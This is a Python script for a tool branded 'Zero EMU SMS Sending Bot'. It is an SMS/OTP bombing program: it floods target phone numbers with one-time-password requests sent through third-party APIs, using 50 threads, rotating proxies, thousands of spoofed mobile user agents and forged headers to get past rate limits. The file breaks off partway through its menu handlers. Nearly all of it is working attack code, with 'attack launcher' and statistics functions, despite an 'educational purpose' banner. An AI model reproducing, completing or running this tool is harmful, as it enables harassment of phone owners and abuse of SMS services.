#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║     ███████╗███████╗██████╗  ██████╗     ███████╗███╗   ███╗██╗   ██╗       ║
║     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝████╗ ████║██║   ██║       ║
║       ███╔╝ █████╗  ██████╔╝██║   ██║    █████╗  ██╔████╔██║██║   ██║       ║
║      ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██╔══╝  ██║╚██╔╝██║██║   ██║       ║
║     ███████╗███████╗██║  ██║╚██████╔╝    ███████╗██║ ╚═╝ ██║╚██████╔╝       ║
║     ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝        ║
║                                                                            ║
║     ███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ████████╗             ║
║     ██╔════╝████╗ ████║██╔════╝     ██╔══██╗██╔═══██╗╚══██╔══╝             ║
║     ███████╗██╔████╔██║█████╗       ██████╔╝██║   ██║   ██║                ║
║     ╚════██║██║╚██╔╝██║██╔══╝       ██╔══██╗██║   ██║   ██║                ║
║     ███████║██║ ╚═╝ ██║███████╗     ██████╔╝╚██████╔╝   ██║                ║
║     ╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝    ╚═╝                ║
║                                                                            ║
║         ███████╗███╗   ██╗██████╗ ███████╗██████╗                         ║
║         ██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗                        ║
║         ███████╗██╔██╗ ██║██║  ██║█████╗  ██████╔╝                        ║
║         ╚════██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗                        ║
║         ███████║██║ ╚████║██████╔╝███████╗██║  ██║                        ║
║         ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝                        ║
║                                                                            ║
║          SMS SENDING BOT BOARD v3.0 — GOLD EDITION                          ║
║     Multi-Proxy | Multi-Thread | 7000+ UA Rotation | Country Switch         ║
║                  Educational Purpose Only                                  ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import random
import threading
import requests
import urllib.parse
import urllib3
from queue import Queue
from datetime import datetime
from colorama import Fore, Back, Style, init

# ─── Initialize ───
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Constants ───
CONFIG_FILE = "config.json"
LOG_DIR = "logs"
BAD_PROXY_FILE = "bad_proxies.txt"
os.makedirs(LOG_DIR, exist_ok=True)

# ██████████████████████████████████████████████████████████████████████████████
# DEFAULT CONFIGURATION
# ██████████████████████████████████████████████████████████████████████████████

DEFAULT_CONFIG = {
    "threads": 50,
    "delay": 0.2,
    "timeout": 8,
    "max_retries": 2,
    "rotate_proxy": True,
    "rotate_ua": True,
    "rotate_mode": "random",
    "country_switch": False,
    "country_codes": ["+880"],
    "numbers_file": "numbers.txt",
    "proxies_file": "proxies.txt",
    "ua_file": "user_agents.txt",
    "api_endpoints": [],
    "api_payloads": [],
    "request_count": 0,
    "success_count": 0,
    "fail_count": 0,
    "running": False,
    "log_requests": True,
    "auto_retry_on_fail": True,
}

# ██████████████████████████████████████████████████████████████████████████████
# 7000+ USER AGENT DATABASE — iPhone + Android Full Coverage
# ██████████████████████████████████████████████████████████████████████████████

# ── iPhone Models (50+ models — iPhone 2G to iPhone 16 Pro Max) ──
IPHONE_MODELS = [
    "iPhone16,2", "iPhone16,1", "iPhone15,5", "iPhone15,4", "iPhone15,3",
    "iPhone15,2", "iPhone15,1", "iPhone14,8", "iPhone14,7", "iPhone14,6",
    "iPhone14,5", "iPhone14,4", "iPhone14,3", "iPhone14,2", "iPhone14,1",
    "iPhone13,5", "iPhone13,4", "iPhone13,3", "iPhone13,2", "iPhone13,1",
    "iPhone12,8", "iPhone12,5", "iPhone12,3", "iPhone12,1",
    "iPhone11,8", "iPhone11,6", "iPhone11,4", "iPhone11,2",
    "iPhone10,6", "iPhone10,5", "iPhone10,4", "iPhone10,3", "iPhone10,2", "iPhone10,1",
    "iPhone9,4", "iPhone9,3", "iPhone9,2", "iPhone9,1",
    "iPhone8,4", "iPhone8,2", "iPhone8,1",
    "iPhone7,2", "iPhone7,1",
    "iPhone6,2", "iPhone6,1",
    "iPhone5,4", "iPhone5,3", "iPhone5,2", "iPhone5,1",
    "iPhone4,1", "iPhone3,3", "iPhone3,1",
]

# ── iOS Versions (12.0 → 18.5) ──
IOS_VERSIONS = [
    "18_5", "18_4", "18_3", "18_2", "18_1", "18_0",
    "17_7", "17_6", "17_5", "17_4", "17_3", "17_2", "17_1", "17_0",
    "16_7", "16_6", "16_5", "16_4", "16_3", "16_2", "16_1", "16_0",
    "15_8", "15_7", "15_6", "15_5", "15_4", "15_3", "15_2", "15_1", "15_0",
    "14_8", "14_7", "14_6", "14_5", "14_4", "14_3", "14_2", "14_1", "14_0",
    "13_7", "13_6", "13_5", "13_4", "13_3", "13_2", "13_1", "13_0",
    "12_5", "12_4", "12_3", "12_2", "12_1", "12_0",
]

# ── Safari Versions ──
SAFARI_VERSIONS = [
    "18.5", "18.4", "18.3", "18.2", "18.1", "18.0",
    "17.7", "17.6", "17.5", "17.4", "17.3", "17.2", "17.1", "17.0",
    "16.7", "16.6", "16.5", "16.4", "16.3", "16.2", "16.1", "16.0",
    "15.8", "15.7", "15.6", "15.5", "15.4", "15.3", "15.2", "15.1", "15.0",
    "14.8", "14.7", "14.6", "14.5", "14.4", "14.3", "14.2", "14.1", "14.0",
    "13.7", "13.6", "13.5", "13.4", "13.3", "13.2", "13.1", "13.0",
    "12.5", "12.4", "12.3", "12.2", "12.1", "12.0",
]

# ── Chrome for iOS Versions ──
CHROME_IOS = [
    "135.0.7049.83", "134.0.6998.89", "133.0.6943.84", "132.0.6834.83",
    "131.0.6778.85", "130.0.6723.90", "129.0.6668.78", "128.0.6613.127",
    "127.0.6533.106", "126.0.6478.153", "125.0.6422.113", "124.0.6367.111",
    "123.0.6312.99", "122.0.6261.111", "121.0.6167.184", "120.0.6099.230",
    "119.0.6045.199", "118.0.5993.99", "117.0.5938.62", "116.0.5845.63",
]

# ── Firefox for iOS Versions ──
FIREFOX_IOS = [
    "130.0", "129.0", "128.0", "127.0", "126.0", "125.0",
    "124.0", "123.0", "122.0", "121.0", "120.0", "119.0",
    "118.0", "117.0", "116.0", "115.0", "114.0", "113.0",
]

# ── Android Models — Samsung ──
SAMSUNG_MODELS = [
    "SM-S938B", "SM-S936B", "SM-S931B", "SM-S928B", "SM-S926B",
    "SM-S921B", "SM-S918B", "SM-S916B", "SM-S911B",
    "SM-S908B", "SM-S906B", "SM-S901B",
    "SM-F956B", "SM-F946B", "SM-F936B", "SM-F926B",
    "SM-F741B", "SM-F731B", "SM-F721B", "SM-F711B",
    "SM-A556B", "SM-A546B", "SM-A536B", "SM-A526B", "SM-A515F",
    "SM-A346E", "SM-A256E", "SM-A245F", "SM-A236E",
    "SM-A155F", "SM-A146B", "SM-A145P", "SM-A136B",
    "SM-A047F", "SM-A037F",
    "SM-G998B", "SM-G996B", "SM-G991B", "SM-G990B",
    "SM-G781B", "SM-G780F", "SM-G770F",
    "SM-N986U", "SM-N985F", "SM-N976B", "SM-N975U", "SM-N971F",
]

# ── Android Models — Xiaomi/Redmi/Poco ──
XIAOMI_MODELS = [
    "24030PN60G", "2401FTC34G", "2311FJN4DG", "23116PN5BC",
    "2311BPN23C", "23078PND5G", "23043RP34G",
    "22101320G", "2211133C", "22081212C",
    "2207117BPG", "22071219AI", "22041219G",
    "2201116SG", "2112123AG", "21121119SC",
    "2109119SG", "21091116G", "21081111RG",
    "2107113SG", "21061119AG", "21051182G",
    "M2102J20SG", "M2011K2G", "M2011J18G",
    "M2007J3SG", "M2007J22G", "M2007J17G",
    "M2006C3MG", "M2006C3LG", "M2003J15SC",
    "Mi 11", "Mi 11X", "Mi 11T", "Mi 11i",
    "Mi 10T", "Mi 10T Pro", "Mi 10", "Mi 10 Pro",
    "Redmi Note 13", "Redmi Note 13 Pro", "Redmi Note 13 Pro+",
    "Redmi Note 12", "Redmi Note 12 Pro", "Redmi Note 12S",
    "Redmi Note 11", "Redmi Note 11S", "Redmi Note 11 Pro",
    "Redmi Note 10", "Redmi Note 10S", "Redmi Note 10 Pro",
    "Redmi 13C", "Redmi 12", "Redmi 12C",
    "Poco F6", "Poco F5", "Poco X6", "Poco X5",
    "Poco M6", "Poco M5", "Poco M4",
]

# ── Android Models — Google Pixel ──
PIXEL_MODELS = [
    "Pixel 9 Pro XL", "Pixel 9 Pro", "Pixel 9", "Pixel 9a",
    "Pixel 8a", "Pixel 8 Pro", "Pixel 8",
    "Pixel 7a", "Pixel 7 Pro", "Pixel 7",
    "Pixel 6a", "Pixel 6 Pro", "Pixel 6",
    "Pixel 5a 5G", "Pixel 5",
    "Pixel 4a 5G", "Pixel 4 XL", "Pixel 4",
    "Pixel 3a XL", "Pixel 3a", "Pixel 3 XL", "Pixel 3",
    "Pixel 2 XL", "Pixel 2",
    "Pixel XL", "Pixel",
]

# ── Android Models — OnePlus ──
ONEPLUS_MODELS = [
    "OnePlus 12", "OnePlus 12R", "OnePlus 11", "OnePlus 11R",
    "OnePlus 10T", "OnePlus 10 Pro", "OnePlus 10R",
    "OnePlus 9RT", "OnePlus 9 Pro", "OnePlus 9R", "OnePlus 9",
    "OnePlus 8T", "OnePlus 8 Pro", "OnePlus 8",
    "OnePlus 7T Pro", "OnePlus 7T", "OnePlus 7 Pro", "OnePlus 7",
    "OnePlus 6T", "OnePlus 6",
    "OnePlus Nord 4", "OnePlus Nord 3", "OnePlus Nord 2", "OnePlus Nord",
]

# ── Android Models — Huawei ──
HUAWEI_MODELS = [
    "HUAWEI P60 Pro", "HUAWEI P60", "HUAWEI P50 Pro", "HUAWEI P50",
    "HUAWEI P40 Pro", "HUAWEI P40", "HUAWEI P30 Pro", "HUAWEI P30",
    "HUAWEI Mate 60 Pro", "HUAWEI Mate 60", "HUAWEI Mate 50 Pro",
    "HUAWEI Mate 40 Pro", "HUAWEI Mate 40",
    "HUAWEI Nova 12 Ultra", "HUAWEI Nova 11 Pro", "HUAWEI Nova 10",
    "ELS-NX9", "ELS-AN00", "NOH-AN00", "NOH-NX9",
    "ANA-AN00", "TAS-AN00", "JAD-AN00",
    "OCE-AN10", "LIO-AN00", "ELE-AN00",
]

# ── Android Versions ──
ANDROID_VERSIONS = [
    "15", "14", "13", "12", "11", "10", "9",
    "8.1.0", "8.0.0", "7.1.2", "7.0", "6.0.1", "6.0",
    "5.1.1", "5.0.2", "5.0",
]

# ── Chrome for Android Versions ──
CHROME_ANDROID = [
    "135.0.7049.84", "134.0.6998.90", "133.0.6943.85", "132.0.6834.84",
    "131.0.6778.86", "130.0.6723.91", "129.0.6668.79", "128.0.6613.127",
    "127.0.6533.107", "126.0.6478.153", "125.0.6422.114", "124.0.6367.111",
    "123.0.6312.99", "122.0.6261.111", "121.0.6167.184", "120.0.6099.230",
    "119.0.6045.199", "118.0.5993.99", "117.0.5938.62", "116.0.5845.63",
]

# ── Samsung Browser Versions ──
SAMSUNG_BROWSER = [
    "27.0", "26.0", "25.0", "24.0", "23.0", "22.0",
    "21.0", "20.0", "19.0", "18.0", "17.0", "16.0",
]

# ── Firefox for Android Versions ──
FIREFOX_ANDROID = [
    "130.0", "129.0", "128.0", "127.0", "126.0", "125.0",
    "124.0", "123.0", "122.0", "121.0", "120.0",
    "119.0", "118.0", "117.0", "116.0", "115.0",
]


# ██████████████████████████████████████████████████████████████████████████████
# UA GENERATOR FUNCTIONS
# ██████████████████████████████████████████████████████████████████████████████

def gen_iphone_safari():
    """iPhone + Safari → ~2800 combinations"""
    m = random.choice(IPHONE_MODELS)
    i = random.choice(IOS_VERSIONS)
    s = random.choice(SAFARI_VERSIONS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{s} Mobile/15E148 Safari/604.1"

def gen_iphone_chrome():
    """iPhone + Chrome → ~1000 combinations"""
    m = random.choice(IPHONE_MODELS)
    i = random.choice(IOS_VERSIONS)
    c = random.choice(CHROME_IOS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{c} Mobile/15E148 Safari/604.1"

def gen_iphone_firefox():
    """iPhone + Firefox → ~800 combinations"""
    m = random.choice(IPHONE_MODELS)
    i = random.choice(IOS_VERSIONS)
    f = random.choice(FIREFOX_IOS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/{f} Mobile/15E148 Safari/604.1"

def gen_iphone_edge():
    """iPhone + Edge → ~500 combinations"""
    m = random.choice(IPHONE_MODELS)
    i = random.choice(IOS_VERSIONS)
    e = random.choice(["127.0", "126.0", "125.0", "124.0", "123.0", "122.0"])
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/{e} Mobile/15E148 Safari/605.1.15"

def gen_samsung_chrome():
    """Samsung + Chrome → ~2000 combinations"""
    m = random.choice(SAMSUNG_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_samsung_browser():
    """Samsung Internet → ~800 combinations"""
    m = random.choice(SAMSUNG_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    s = random.choice(SAMSUNG_BROWSER)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; SAMSUNG {m}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{s} Chrome/{c} Mobile Safari/537.36"

def gen_xiaomi_chrome():
    """Xiaomi + Chrome → ~1500 combinations"""
    m = random.choice(XIAOMI_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_pixel_chrome():
    """Pixel + Chrome → ~500 combinations"""
    m = random.choice(PIXEL_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_oneplus_chrome():
    """OnePlus + Chrome → ~400 combinations"""
    m = random.choice(ONEPLUS_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_huawei_chrome():
    """Huawei + Chrome → ~400 combinations"""
    m = random.choice(HUAWEI_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_android_firefox():
    """Android + Firefox → ~200 combinations"""
    a = random.choice(ANDROID_VERSIONS)
    f = random.choice(FIREFOX_ANDROID)
    pool = SAMSUNG_MODELS + XIAOMI_MODELS + PIXEL_MODELS
    m = random.choice(pool)
    return f"Mozilla/5.0 (Android {a}; Mobile; rv:{f}.0) Gecko/{f}.0 Firefox/{f}.0"

def gen_ipad_safari():
    """iPad + Safari → ~400 combinations"""
    i = random.choice(IOS_VERSIONS)
    s = random.choice(SAFARI_VERSIONS)
    ipad = ["iPad14,6", "iPad14,5", "iPad14,4", "iPad13,11", "iPad13,10", "iPad13,9"]
    return f"Mozilla/5.0 (iPad; CPU OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{s} Mobile/15E148 Safari/604.1"

# ─── UA Generator Registry (with weights for realistic distribution) ───
UA_GENERATORS = [
    (gen_iphone_safari, 20),
    (gen_iphone_chrome, 12),
    (gen_iphone_firefox, 6),
    (gen_iphone_edge, 3),
    (gen_samsung_chrome, 17),
    (gen_samsung_browser, 8),
    (gen_xiaomi_chrome, 14),
    (gen_pixel_chrome, 6),
    (gen_oneplus_chrome, 5),
    (gen_huawei_chrome, 4),
    (gen_android_firefox, 3),
    (gen_ipad_safari, 2),
]


# ██████████████████████████████████████████████████████████████████████████████
# CORE FUNCTIONS
# ██████████████████████████████████████████████████████████████████████████████

def get_random_ua(custom_uas=None):
    """Get weighted random user agent"""
    if custom_uas and random.random() < 0.25:
        return random.choice(custom_uas)
    gens, weights = zip(*UA_GENERATORS)
    return random.choices(gens, weights=weights, k=1)[0]()

def get_proxy(proxies, mode="random", idx=[0]):
    """Get proxy with rotation mode"""
    if not proxies:
        return None
    if mode == "sequential":
        with threading.Lock():
            p = proxies[idx[0] % len(proxies)]
            idx[0] += 1
    else:
        p = random.choice(proxies)
    if p.startswith("socks5"):
        return {"http": p.replace("socks5", "socks5h"), "https": p.replace("socks5", "socks5h")}
    return {"http": p, "https": p}

def apply_country(number, enabled, codes):
    """Apply country code switching"""
    if not enabled or not codes:
        return number
    for c in codes:
        if number.startswith(c):
            number = number[len(c):]
            break
    code = random.choice(codes)
    return code + number

def load_file(path, label="data"):
    """Load text lines from file"""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = [l.strip() for l in f if l.strip()]
        return data
    except:
        return []

def save_config(cfg):
    """Save config to JSON"""
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=2)
    except:
        pass

def load_config():
    """Load config from JSON"""
    cfg = dict(DEFAULT_CONFIG)
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                cfg.update(json.load(f))
        except:
            pass
    return cfg

def gen_headers(custom_uas, rotate_ua=True):
    """Generate realistic HTTP headers"""
    return {
        "User-Agent": get_random_ua(custom_uas) if rotate_ua else "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "bn-BD,bn;q=0.9,en;q=0.8", "hi-IN,hi;q=0.9,en;q=0.8", "ar-SA,ar;q=0.9,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": random.choice(["https://www.google.com", "https://m.facebook.com", "https://www.imo.im"]),
        "Referer": random.choice(["https://www.google.com/", "https://m.facebook.com/", "https://www.imo.im/"]),
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
    }


# ██████████████████████████████████████████████████████████████████████████████
# NETWORK FUNCTIONS
# ██████████████████████████████████████████████████████████████████████████████

def send_otp(number, api_url, payload_tpl, cfg, proxies_list, custom_uas, session):
    """Send a single OTP request"""
    try:
        final_num = apply_country(number, cfg["country_switch"], cfg["country_codes"])
        payload = {}
        for k, v in payload_tpl.items():
            if v is None:
                payload[k] = final_num
            elif isinstance(v, str):
                payload[k] = v.format(phone=final_num)
            else:
                payload[k] = v
        
        headers = gen_headers(custom_uas, cfg["rotate_ua"])
        proxy = get_proxy(proxies_list, cfg["rotate_mode"]) if cfg["rotate_proxy"] else None
        
        # Handle GET requests
        url = api_url
        if "?" in api_url or payload.get("method") == "GET":
            base = api_url.split("?")[0]
            r = session.get(base, params=payload, headers=headers, proxies=proxy, timeout=cfg["timeout"], verify=False)
        else:
            r = session.post(api_url, json=payload, headers=headers, proxies=proxy, timeout=cfg["timeout"], verify=False)
        
        return {
            "ok": 200 <= r.status_code < 400,
            "code": r.status_code,
            "number": final_num,
            "proxy": proxy["http"][:30] if proxy else "direct",
            "text": r.text[:100],
        }
    except Exception as e:
        return {"ok": False, "code": 0, "number": number, "error": str(e)[:60]}


# ██████████████████████████████████████████████████████████████████████████████
# WORKER THREAD
# ██████████████████████████████████████████████████████████████████████████████

def worker(q, cfg, proxies_list, custom_uas):
    """Worker thread — pulls jobs from queue and sends requests"""
    session = requests.Session()
    session.verify = False
    while cfg["running"]:
        try:
            job = q.get(timeout=1)
            if job is None:
                break
            num, url, ptpl = job
            for attempt in range(cfg["max_retries"] + 1):
                if not cfg["running"]:
                    break
                result = send_otp(num, url, ptpl, cfg, proxies_list, custom_uas, session)
                with threading.Lock():
                    cfg["request_count"] += 1
                    if result and result.get("ok"):
                        cfg["success_count"] += 1
                        print(f"{Fore.GREEN}  ✓ #{cfg['request_count']:06d} | {result['number']} | {result['code']} | {result.get('proxy','?')}")
                    else:
                        cfg["fail_count"] += 1
                        err = result.get("error", f"HTTP {result.get('code','?')}") if result else "No response"
                        print(f"{Fore.RED}  ✗ #{cfg['request_count']:06d} | {num} | {err}")
                        if attempt < cfg["max_retries"]:
                            time.sleep(1)
                            continue
                    break
                time.sleep(cfg["delay"])
            q.task_done()
        except:
            continue


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK LAUNCHER
# ██████████████████████████████████████████████████████████████████████████████

def start_attack(cfg, numbers, proxies_list, custom_uas):
    """Start the attack engine"""
    if not numbers:
        print(f"{Fore.RED}  [!] No numbers. Load numbers first.")
        return
    if not cfg["api_endpoints"]:
        print(f"{Fore.RED}  [!] No API endpoints. Set API first (option 7).")
        return
    
    cfg["running"] = True
    cfg["request_count"] = 0
    cfg["success_count"] = 0
    cfg["fail_count"] = 0
    
    log_file = f"{LOG_DIR}/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    with open(log_file, "w") as f:
        f.write(f"Zero EMU Attack Log\nStarted: {datetime.now()}\nTargets: {len(numbers)}\nAPIs: {len(cfg['api_endpoints'])}\nProxies: {len(proxies_list)}\nThreads: {cfg['threads']}\n{'='*50}\n")
    
    print(f"\n{Fore.CYAN}  ╔══════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}  ║  {Fore.GREEN}🚀 ATTACK STARTED{Fore.CYAN}                              ║")
    print(f"{Fore.CYAN}  ╠══════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}  ║  Targets: {len(numbers)}  APIs: {len(cfg['api_endpoints'])}  Proxies: {len(proxies_list)}  ║")
    print(f"{Fore.CYAN}  ║  Threads: {cfg['threads']}  Delay: {cfg['delay']}s  Retry: {cfg['max_retries']}    ║")
    print(f"{Fore.CYAN}  ║  Press {Fore.RED}[X]{Fore.CYAN} in menu to STOP                    ║")
    print(f"{Fore.CYAN}  ╚══════════════════════════════════════════════╝\n")
    
    q = Queue(maxsize=10000)
    
    def producer():
        while cfg["running"]:
            for n in numbers:
                for u, p in zip(cfg["api_endpoints"], cfg["api_payloads"]):
                    if not cfg["running"]: return
                    try: q.put((n, u, p), timeout=1)
                    except: pass
                    time.sleep(0.001)
    
    threads = []
    for _ in range(cfg["threads"]):
        t = threading.Thread(target=worker, args=(q, cfg, proxies_list, custom_uas), daemon=True)
        t.start()
        threads.append(t)
    
    prod = threading.Thread(target=producer, daemon=True)
    prod.start()
    
    try:
        while cfg["running"]:
            time.sleep(2)
            total = cfg["request_count"]
            ok = cfg["success_count"]
            fail = cfg["fail_count"]
            rate = total / 2 if total > 0 else 0
            pct = (ok / total * 100) if total > 0 else 0
            bar_sz = 25
            filled = int(bar_sz * ok / total) if total > 0 else 0
            bar = f"{Fore.GREEN}{'█'*filled}{Fore.RED}{'█'*(bar_sz-filled)}{Style.RESET_ALL}"
            
            with open(log_file, "a") as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Total:{total} OK:{ok} Fail:{fail} Rate:{rate:.0f}/s\n")
            
            print(f"\r{Fore.CYAN}[{datetime.now().strftime('%H:%M:%S')}] T:{Fore.WHITE}{total:06d} {Fore.GREEN}✓{ok:05d} {Fore.RED}✗{fail:05d} {Style.RESET_ALL}| {bar} {Fore.YELLOW}{pct:.1f}% | {Fore.MAGENTA}{rate:.0f} req/s{Style.RESET_ALL}   ", end="")
    except:
        pass


# ██████████████████████████████████████████████████████████████████████████████
# DISPLAY FUNCTIONS
# ██████████████████████████████████████████████████████████████████████████████

def show_banner():
    """Display the main banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Fore.RED}
{Fore.RED}  ███████╗███████╗██████╗  ██████╗     ███████╗███╗   ███╗██╗   ██╗{Fore.YELLOW}
{Fore.RED}  ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝████╗ ████║██║   ██║{Fore.YELLOW}
{Fore.RED}    ███╔╝ █████╗  ██████╔╝██║   ██║    █████╗  ██╔████╔██║██║   ██║{Fore.YELLOW}
{Fore.RED}   ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██╔══╝  ██║╚██╔╝██║██║   ██║{Fore.YELLOW}
{Fore.RED}  ███████╗███████╗██║  ██║╚██████╔╝    ███████╗██║ ╚═╝ ██║╚██████╔╝{Fore.YELLOW}
{Fore.RED}  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝ {Fore.YELLOW}
{Fore.CYAN}  ════════════════════════════════════════════════════════════════════{Fore.YELLOW}
{Fore.CYAN}       SMS SENDING BOT BOARD v3.0 — GOLD EDITION{Fore.YELLOW}
{Fore.CYAN}         7000+ UA | Multi-Proxy | Multi-Thread | Country Switch{Fore.YELLOW}
{Fore.CYAN}  ════════════════════════════════════════════════════════════════════{Style.RESET_ALL}
    """)

def show_status(cfg, numbers, proxies_list, custom_uas):
    """Show current config status"""
    run = "▶ RUNNING" if cfg["running"] else "⏸ STOPPED"
    run_color = Fore.GREEN if cfg["running"] else Fore.RED
    
    print(f"{Fore.CYAN}  ┌─── {Fore.YELLOW}STATUS DASHBOARD{Fore.CYAN} ───────────────────────────────────────┐")
    print(f"{Fore.CYAN}  │ {Fore.WHITE}📱 Numbers: {Fore.GREEN}{len(numbers):<5}{Fore.CYAN} │ {Fore.WHITE}🌐 Proxies: {Fore.GREEN}{len(proxies_list):<5}{Fore.CYAN} │ {Fore.WHITE}🎭 UA Custom: {Fore.GREEN}{len(custom_uas):<4}{Fore.CYAN} │")
    print(f"{Fore.CYAN}  │ {Fore.WHITE}🔗 APIs: {Fore.GREEN}{len(cfg['api_endpoints']):<6}{Fore.CYAN} │ {Fore.WHITE}🧵 Threads: {Fore.GREEN}{cfg['threads']:<5}{Fore.CYAN} │ {Fore.WHITE}⏱ Delay: {Fore.GREEN}{cfg['delay']}s{Fore.CYAN}       │")
    print(f"{Fore.CYAN}  │ {Fore.WHITE}🔄 UA Rotate: {Fore.GREEN}{'ON' if cfg['rotate_ua'] else 'OFF':<6}{Fore.CYAN} │ {Fore.WHITE}🔀 Proxy: {Fore.GREEN}{cfg['rotate_mode']:<8}{Fore.CYAN} │ {Fore.WHITE}🌍 Country: {Fore.GREEN}{'ON' if cfg['country_switch'] else 'OFF':<4}{Fore.CYAN} │")
    if cfg["country_switch"]:
        print(f"{Fore.CYAN}  │ {Fore.WHITE}🌍 Codes: {Fore.GREEN}{', '.join(cfg['country_codes']):<30}{Fore.CYAN}│")
    print(f"{Fore.CYAN}  │ {Fore.WHITE}▶ Status: {run_color}{run:<8}{Fore.CYAN} │ {Fore.WHITE}📊 Reqs: {cfg['request_count']:06d} {Fore.GREEN}✓{cfg['success_count']:05d} {Fore.RED}✗{cfg['fail_count']:05d}{Fore.CYAN}│")
    print(f"{Fore.CYAN}  └─────────────────────────────────────────────────────────────┘")

def show_menu():
    """Display main menu options"""
    print(f"""{Fore.YELLOW}  ╔════════════════════════ MAIN MENU ═══════════════════════════╗
  ║                                                            ║
  ║  {Fore.CYAN}[1]  📂 Load Numbers from TXT File{Fore.YELLOW}                          ║
  ║  {Fore.CYAN}[2]  📋 View Loaded Numbers{Fore.YELLOW}                                 ║
  ║  {Fore.CYAN}[3]  ➕ Add Number Manually{Fore.YELLOW}                                  ║
  ║  {Fore.CYAN}[4]  🔌 Load Proxies from File{Fore.YELLOW}                               ║
  ║  {Fore.CYAN}[5]  ➕ Add Proxy Manually{Fore.YELLOW}                                   ║
  ║  {Fore.CYAN}[6]  🌐 Test All Proxies (Auto Clean){Fore.YELLOW}                       ║
  ║  {Fore.CYAN}[7]  🔗 Set OTP API Endpoints{Fore.YELLOW}             {Fore.RED}← সবচেয়ে গুরুত্বপূর্ণ{Fore.YELLOW}  ║
  ║  {Fore.CYAN}[8]  🌍 Set Country Code Switch{Fore.YELLOW}                             ║
  ║  {Fore.CYAN}[9]  📱 User Agent Manager (Auto 7000+){Fore.YELLOW}                    ║
  ║  {Fore.CYAN}[10] ⚙️  Attack Settings (Threads/Delay/Retry){Fore.YELLOW}               ║
  ║  {Fore.CYAN}[11] 🎯 Select Specific Numbers for Attack{Fore.YELLOW}                  ║
  ║  {Fore.CYAN}[12] 🔀 Set Proxy Rotation Mode{Fore.YELLOW}                             ║
  ║  {Fore.CYAN}[13] 📊 View Attack Statistics{Fore.YELLOW}                              ║
  ║  {Fore.CYAN}[14] 💾 Save/Load Configuration{Fore.YELLOW}                             ║
  ║                                                            ║
  ║  {Fore.GREEN}[S] 🚀 START ATTACK{Fore.YELLOW}                                         ║
  ║  {Fore.RED}[X] 🛑 STOP ATTACK{Fore.YELLOW}                                           ║
  ║                                                            ║
  ║  {Fore.WHITE}[0] ❌ Exit Program{Fore.YELLOW}                                          ║
  ╚══════════════════════════════════════════════════════════════╝
    """)


# ██████████████████████████████████████████████████████████████████████████████
# MENU HANDLERS
# ██████████████████████████████████████████████████████████████████████████████

def handle_set_apis(cfg):
    """Configure OTP API endpoints"""
